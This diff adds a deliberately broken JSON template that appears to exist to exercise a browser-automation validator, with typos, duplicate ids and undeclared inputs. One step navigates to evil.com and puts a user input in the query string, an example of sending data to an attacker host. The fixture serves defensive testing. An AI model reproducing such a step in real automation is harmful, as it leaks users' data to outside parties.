@@ -1,0 +1,18 @@
+{
+  "id": "test/broken",
+  "version": "0.1.0",
+  "title": "deliberately broken template for validate tests",
+  "site": ["example.com"],
+  "inputs": { "q": { "type": "string" } },
+  "steps": [
+    { "id": "open", "action": "goto", "url": "https://evil.com/?q={{inputs.q}}" },
+    { "id": "open", "action": "click", "target": [{ "css": "a" }] },
+    { "id": "typo", "action": "clik", "target": [{ "css": "a" }] },
+    { "id": "use-undeclared", "action": "fill", "target": [{ "testid": "x" }, { "css": "#x" }], "value": "{{inputs.nope}} {{vars.later}}" },
+    { "id": "loop", "action": "while", "when": { "exists": [{ "css": "x" }] }, "do": [] },
+    { "id": "bad-cond", "action": "assert", "that": { "greaterThan": [1, 2] } },
+    { "id": "script", "action": "runScript", "script": "not-whitelisted", "optional": true },
+    { "id": "two-keys", "action": "click", "target": [{ "css": "a", "testid": "b" }], "expect": { "urlContains": "/x" } },
+    { "id": "later", "action": "read", "target": [{ "css": "h1" }, { "xpath": "//h1" }], "saveAs": "later" }
+  ]
+}
